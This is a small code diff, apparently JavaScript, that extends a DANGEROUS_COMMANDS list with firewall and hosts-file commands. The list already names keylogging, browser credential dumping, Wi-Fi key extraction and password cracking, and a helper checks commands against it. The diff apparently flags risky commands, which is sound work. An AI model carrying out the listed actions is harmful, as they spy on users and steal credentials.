@@ -56,7 +56,11 @@ const DANGEROUS_COMMANDS = [
     'keylogger start',
     'chromedump',
     'wifikeys',
-    'crackpassword'
+    'crackpassword',
+    'firewall open',
+    'firewall close',
+    'hostsfile update',
+    'hostsfile remove'
 ];
 
 // Helper function to check if a command is dangerous
